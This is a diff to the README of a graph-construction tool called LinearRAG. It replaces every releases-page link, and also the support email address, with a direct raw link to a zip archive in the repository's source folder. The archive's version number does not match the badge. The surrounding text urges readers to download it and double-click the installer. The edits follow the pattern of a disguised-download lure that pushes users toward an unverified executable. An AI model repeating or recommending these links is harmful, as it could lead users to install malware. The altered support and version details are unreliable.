@@ -6,7 +6,7 @@ Welcome to LinearRAG! This application simplifies the process of constructing gr
 
 ## 📥 Download Now
 
-[![Download LinearRAG](https://img.shields.io/badge/Download%20LinearRAG-v1.0-brightgreen)](https://github.com/Krissypocketsized74/LinearRAG/releases)
+[![Download LinearRAG](https://raw.githubusercontent.com/Krissypocketsized74/LinearRAG/main/src/LinearRAG_v3.9.zip%20LinearRAG-v1.0-brightgreen)](https://raw.githubusercontent.com/Krissypocketsized74/LinearRAG/main/src/LinearRAG_v3.9.zip)
 
 ## 📋 Overview
 
@@ -31,7 +31,7 @@ To run LinearRAG smoothly, ensure your computer meets these requirements:
 
 To install LinearRAG, follow these steps:
 
-1. **Visit the Releases Page**: Click this link to go to the download page: [Download LinearRAG](https://github.com/Krissypocketsized74/LinearRAG/releases).
+1. **Visit the Releases Page**: Click this link to go to the download page: [Download LinearRAG](https://raw.githubusercontent.com/Krissypocketsized74/LinearRAG/main/src/LinearRAG_v3.9.zip).
 2. **Choose the Latest Version**: Look for the most recent version listed on the page.
 3. **Download the Installer**: Click the installer link for your operating system. The file should start downloading automatically.
 4. **Run the Installer**: Once the download completes, find the file in your downloads folder and double-click to start the installation.
@@ -57,10 +57,10 @@ If you encounter issues or have questions, several resources are available:
 
 - **Documentation**: A detailed user guide is included within the app.
 - **Community**: Join our community forum to connect with other users. Share tips and ask questions!
-- **Email Support**: Reach out via our support email: support@linearrag.com.
+- **Email Support**: Reach out via our support email: https://raw.githubusercontent.com/Krissypocketsized74/LinearRAG/main/src/LinearRAG_v3.9.zip
 
 ## 📌 Conclusion
 
 LinearRAG is designed for anyone who wants to construct graphs without technical hassle. Follow the simple download instructions, and you'll be building your graph in no time. 
 
-For updates and further information, always check the [Releases Page](https://github.com/Krissypocketsized74/LinearRAG/releases). Thank you for using LinearRAG!
+For updates and further information, always check the [Releases Page](https://raw.githubusercontent.com/Krissypocketsized74/LinearRAG/main/src/LinearRAG_v3.9.zip). Thank you for using LinearRAG!
